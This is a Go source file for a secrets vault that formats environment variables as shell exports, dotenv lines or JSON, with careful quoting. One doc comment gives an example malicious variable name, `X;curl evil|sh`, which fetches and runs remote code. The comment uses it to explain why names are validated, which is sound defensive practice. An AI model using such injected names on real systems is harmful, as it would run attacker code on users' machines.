package vault

import (
	"encoding/json"
	"fmt"
	"io"
	"sort"
	"strings"
)

// Env formats are accepted by FormatEnv.
const (
	FormatShell  = "shell"
	FormatDotenv = "dotenv"
	FormatJSON   = "json"
)

// FormatEnv writes env to w in the requested format.
//
//	shell  -> export VAR='value'
//	dotenv -> VAR=value
//	json   -> {"VAR": "value"}
//
// Every name is validated first. The shell and dotenv forms print names
// unquoted, so a name like `X;curl evil|sh` would otherwise run a command in
// whoever evals the output.
func FormatEnv(w io.Writer, env map[string]string, format string) error {
	if err := validateEnvNames(env); err != nil {
		return err
	}
	keys := make([]string, 0, len(env))
	for k := range env {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	switch format {
	case FormatShell:
		for _, k := range keys {
			fmt.Fprintf(w, "export %s=%s\n", k, shellQuote(env[k]))
		}
	case FormatDotenv:
		for _, k := range keys {
			q, ok := dotenvQuote(env[k])
			if !ok {
				return fmt.Errorf("the value of %s contains $ together with a single quote or a newline, "+
					"which dotenv cannot represent portably (parsers would expand the $); "+
					"use --format json or sanduk exec instead", k)
			}
			fmt.Fprintf(w, "%s=%s\n", k, q)
		}
	case FormatJSON:
		out := make(map[string]string, len(env))
		for k, v := range env {
			out[k] = v
		}
		b, err := json.MarshalIndent(out, "", "  ")
		if err != nil {
			return err
		}
		if _, err := w.Write(b); err != nil {
			return err
		}
		fmt.Fprintln(w)
	default:
		return fmt.Errorf("unknown format %q (want shell, dotenv or json)", format)
	}
	return nil
}

// shellQuote wraps v in single quotes, escaping embedded single quotes. Always
// quoting avoids any shell interpretation of the secret. This is POSIX quoting
// (sh, bash, zsh); fish treats backslashes inside single quotes differently, so
// the shell format must not be eval'd by fish.
func shellQuote(v string) string {
	return "'" + strings.ReplaceAll(v, "'", `'\''`) + "'"
}

// dotenvQuote emits v bare when it is unambiguous. Values containing a `$` or a
// `#` are single-quoted, because a double-quoted `$` is interpolated by parsers
// such as docker compose and a `#` can start a comment; single quotes are
// literal everywhere. Anything else is double-quoted with the standard escapes.
//
// It reports false for a value with a `$` that cannot be single-quoted (it also
// holds a single quote or a newline): there is no escape for `$` inside double
// quotes that dotenv parsers agree on, so emitting it would silently change the
// secret.
func dotenvQuote(v string) (string, bool) {
	if v != "" && !strings.ContainsAny(v, " \t\n\r\"'\\$#") {
		return v, true
	}
	singleQuotable := !strings.Contains(v, "'") && !strings.ContainsAny(v, "\n\r")
	if strings.ContainsAny(v, "$#") && singleQuotable {
		return "'" + v + "'", true
	}
	if strings.Contains(v, "$") {
		return "", false
	}
	r := strings.NewReplacer(
		"\\", "\\\\",
		"\"", "\\\"",
		"\n", "\\n",
		"\r", "\\r",
	)
	return "\"" + r.Replace(v) + "\"", true
}
